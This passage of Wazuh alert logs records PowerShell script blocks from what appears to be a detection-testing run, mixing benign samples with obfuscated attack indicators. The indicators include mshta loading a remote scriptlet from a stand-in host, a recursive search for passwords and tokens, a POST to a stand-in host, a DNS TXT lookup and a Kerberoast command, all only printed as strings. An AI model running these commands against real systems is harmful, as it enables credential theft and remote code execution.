''','httPS://API.','ex`amPlE.iN','V`AlId/Ch`EcKi','N'' -bOdY',' @{hosT=''wS-','01'';uSEr=''','AnA`LYSt'';stat','US=''o','K''}'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 81991c6d-a367-42be-8803-02c1d3bf5a9f\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-262'; $parts=@('invO`Ke','-REs`TmetHod ','-MeT`HoD pO','sT -Uri ''','httPS://API.','ex`amPlE.iN','V`AlId/Ch`EcKi','N'' -bOdY',' @{hosT=''wS-','01'';uSEr=''','AnA`LYSt'';stat','US=''o','K''}'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"81991c6d-a367-42be-8803-02c1d3bf5a9f\"}}}","id":"1784281056.588065","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:36.849+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"1acbd15d-3610-4b00-a3bb-328eedb71f7b","scriptBlockText":"$sampleId='PST-263'; Get-CimInstance Win32_BIOS | Select-Object Manufacturer, SerialNumber; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723699","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-263'; Get-CimInstance Win32_BIOS | Select-Object Manufacturer, SerialNumber; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 1acbd15d-3610-4b00-a3bb-328eedb71f7b\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:36.2254158Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:36.2254158Z\",\"eventRecordID\":\"723699\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-263'; Get-CimInstance Win32_BIOS | Select-Object Manufacturer, SerialNumber; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 1acbd15d-3610-4b00-a3bb-328eedb71f7b\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-263'; Get-CimInstance Win32_BIOS | Select-Object Manufacturer, SerialNumber; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"1acbd15d-3610-4b00-a3bb-328eedb71f7b\"}}}","id":"1784281057.588065","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:37.000+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"d5ca43ac-af77-49cf-86e8-8f8749567075","scriptBlockText":"$sampleId='PST-264'; $name = ('weekly' + '-' + 'inventory' + '-' + 'report' + '-' + $env:COMPUTERNAME); Write-Output $name; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723701","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-264'; $name = ('weekly' + '-' + 'inventory' + '-' + 'report' + '-' + $env:COMPUTERNAME); Write-Output $name; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: d5ca43ac-af77-49cf-86e8-8f8749567075\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:36.5794184Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:36.5794184Z\",\"eventRecordID\":\"723701\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-264'; $name = ('weekly' + '-' + 'inventory' + '-' + 'report' + '-' + $env:COMPUTERNAME); Write-Output $name; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: d5ca43ac-af77-49cf-86e8-8f8749567075\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-264'; $name = ('weekly' + '-' + 'inventory' + '-' + 'report' + '-' + $env:COMPUTERNAME); Write-Output $name; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"d5ca43ac-af77-49cf-86e8-8f8749567075\"}}}","id":"1784281057.590245","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script querying system environment variables","firedtimes":23,"groups":["windows"," powershell"],"id":"91816","level":4,"mail":false,"mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]}},"timestamp":"2026-07-17T11:37:37.031+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"62c8e103-1f5d-4e66-95d3-b4cf7743b2a0","scriptBlockText":"$sampleId='PST-265'; Get-Date | Select-Object DateTime; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723703","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-265'; Get-Date | Select-Object DateTime; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 62c8e103-1f5d-4e66-95d3-b4cf7743b2a0\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:36.9054448Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:36.9054448Z\",\"eventRecordID\":\"723703\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-265'; Get-Date | Select-Object DateTime; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 62c8e103-1f5d-4e66-95d3-b4cf7743b2a0\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-265'; Get-Date | Select-Object DateTime; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"62c8e103-1f5d-4e66-95d3-b4cf7743b2a0\"}}}","id":"1784281057.590245","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:37.890+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"1bef3a25-8ca0-45e9-87e9-baed5395dada","scriptBlockText":"$sampleId='PST-266'; $parts=@('geT-cHildiT','`em -patH',' ''C:\\\\uSers'' -','ReC`urSE',' -inCLuDE',' ''*.COnf`I','G'',''*.xml'' ','| seleCt-','sTRIng ','-pa`ttErn',' ''PaSSWOrd|toKE','N|Se`cr','ET'''); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723706","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-266'; $parts=@('geT-cHildiT','`em -patH',' ''C:\\uSers'' -','ReC`urSE',' -inCLuDE',' ''*.COnf`I','G'',''*.xml'' ','| seleCt-','sTRIng ','-pa`ttErn',' ''PaSSWOrd|toKE','N|Se`cr','ET'''); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 1bef3a25-8ca0-45e9-87e9-baed5395dada\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:37.2337409Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:37.2337409Z\",\"eventRecordID\":\"723706\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-266'; $parts=@('geT-cHildiT','`em -patH',' ''C:\\\\uSers'' -','ReC`urSE',' -inCLuDE',' ''*.COnf`I','G'',''*.xml'' ','| seleCt-','sTRIng ','-pa`ttErn',' ''PaSSWOrd|toKE','N|Se`cr','ET'''); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 1bef3a25-8ca0-45e9-87e9-baed5395dada\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-266'; $parts=@('geT-cHildiT','`em -patH',' ''C:\\\\\\\\uSers'' -','ReC`urSE',' -inCLuDE',' ''*.COnf`I','G'',''*.xml'' ','| seleCt-','sTRIng ','-pa`ttErn',' ''PaSSWOrd|toKE','N|Se`cr','ET'''); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"1bef3a25-8ca0-45e9-87e9-baed5395dada\"}}}","id":"1784281057.590245","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:37.902+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"bdd057e2-2774-4e2c-aa88-9996c0b259e1","scriptBlockText":"$sampleId='PST-267'; $indicator='mshta.exe ja' + 'vascrip' + 't:a=GetO' + 'bject(''' + 'script' + ':https:/' + '/hta.exa' + 'mple.inva' + 'lid/a.sct'')' + '.Exec();clos' + 'e()'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723710","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-267'; $indicator='mshta.exe ja' + 'vascrip' + 't:a=GetO' + 'bject(''' + 'script' + ':https:/' + '/hta.exa' + 'mple.inva' + 'lid/a.sct'')' + '.Exec();clos' + 'e()'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: bdd057e2-2774-4e2c-aa88-9996c0b259e1\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:37.5644934Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:37.5644934Z\",\"eventRecordID\":\"723710\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-267'; $indicator='mshta.exe ja' + 'vascrip' + 't:a=GetO' + 'bject(''' + 'script' + ':https:/' + '/hta.exa' + 'mple.inva' + 'lid/a.sct'')' + '.Exec();clos' + 'e()'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: bdd057e2-2774-4e2c-aa88-9996c0b259e1\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-267'; $indicator='mshta.exe ja' + 'vascrip' + 't:a=GetO' + 'bject(''' + 'script' + ':https:/' + '/hta.exa' + 'mple.inva' + 'lid/a.sct'')' + '.Exec();clos' + 'e()'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"bdd057e2-2774-4e2c-aa88-9996c0b259e1\"}}}","id":"1784281057.590245","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:37.962+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"53936a54-7164-4601-9ca5-2128e3156871","scriptBlockText":"$sampleId='PST-268'; $indicator='Resolve-DnsN' + 'ame -Typ' + 'e TXT -Na' + 'me ''task' + '.example.' + 'invalid'' ' + '| Select-' + 'Object -Expan' + 'dProperty ' + 'Stri' + 'ngs'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723713","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-268'; $indicator='Resolve-DnsN' + 'ame -Typ' + 'e TXT -Na' + 'me ''task' + '.example.' + 'invalid'' ' + '| Select-' + 'Object -Expan' + 'dProperty ' + 'Stri' + 'ngs'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 53936a54-7164-4601-9ca5-2128e3156871\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:37.8897273Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:37.8897273Z\",\"eventRecordID\":\"723713\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-268'; $indicator='Resolve-DnsN' + 'ame -Typ' + 'e TXT -Na' + 'me ''task' + '.example.' + 'invalid'' ' + '| Select-' + 'Object -Expan' + 'dProperty ' + 'Stri' + 'ngs'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 53936a54-7164-4601-9ca5-2128e3156871\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-268'; $indicator='Resolve-DnsN' + 'ame -Typ' + 'e TXT -Na' + 'me ''task' + '.example.' + 'invalid'' ' + '| Select-' + 'Object -Expan' + 'dProperty ' + 'Stri' + 'ngs'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"53936a54-7164-4601-9ca5-2128e3156871\"}}}","id":"1784281058.590245","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:38.897+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"cca28473-4c1f-44a7-90a0-0ae4b3a84a69","scriptBlockText":"$sampleId='PST-269'; Get-WinEvent -ListLog *PowerShell* | Select-Object LogName, RecordCount; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723717","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-269'; Get-WinEvent -ListLog *PowerShell* | Select-Object LogName, RecordCount; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: cca28473-4c1f-44a7-90a0-0ae4b3a84a69\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:38.2245162Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:38.2245162Z\",\"eventRecordID\":\"723717\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-269'; Get-WinEvent -ListLog *PowerShell* | Select-Object LogName, RecordCount; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: cca28473-4c1f-44a7-90a0-0ae4b3a84a69\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-269'; Get-WinEvent -ListLog *PowerShell* | Select-Object LogName, RecordCount; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"cca28473-4c1f-44a7-90a0-0ae4b3a84a69\"}}}","id":"1784281058.590245","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:38.905+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"bd3fc2b8-259f-4551-96c3-755e546a529d","scriptBlockText":"$sampleId='PST-270'; Get-ItemProperty -Path 'HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' -ErrorAction SilentlyContinue | Select-Object -First 3 PSChildName; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723730","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-270'; Get-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -ErrorAction SilentlyContinue | Select-Object -First 3 PSChildName; Write-Output 'hard benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: bd3fc2b8-259f-4551-96c3-755e546a529d\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:38.5604896Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:38.5604896Z\",\"eventRecordID\":\"723730\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-270'; Get-ItemProperty -Path 'HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' -ErrorAction SilentlyContinue | Select-Object -First 3 PSChildName; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: bd3fc2b8-259f-4551-96c3-755e546a529d\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-270'; Get-ItemProperty -Path 'HKCU:\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run' -ErrorAction SilentlyContinue | Select-Object -First 3 PSChildName; Write-Output 'hard benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"bd3fc2b8-259f-4551-96c3-755e546a529d\"}}}","id":"1784281059.590245","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:39.017+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"9ee2ee4f-f584-4fc9-9030-552e1c142678","scriptBlockText":"$sampleId='PST-271'; $indicator='Invoke-Kerberoast -OutputFormat Hashcat | Select-Object SamAccountName,Hash'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723736","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-271'; $indicator='Invoke-Kerberoast -OutputFormat Hashcat | Select-Object SamAccountName,Hash'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 9ee2ee4f-f584-4fc9-9030-552e1c142678\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:39.1359317Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:39.1359317Z\",\"eventRecordID\":\"723736\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-271'; $indicator='Invoke-Kerberoast -OutputFormat Hashcat | Select-Object SamAccountName,Hash'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 9ee2ee4f-f584-4fc9-9030-552e1c142678\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-271'; $indicator='Invoke-Kerberoast -OutputFormat Hashcat | Select-Object SamAccountName,Hash'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"9ee2ee4f-f584-4fc9-9030-552e1c142678\"}}}","id":"1784281059.590245","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:39.988+0200"}
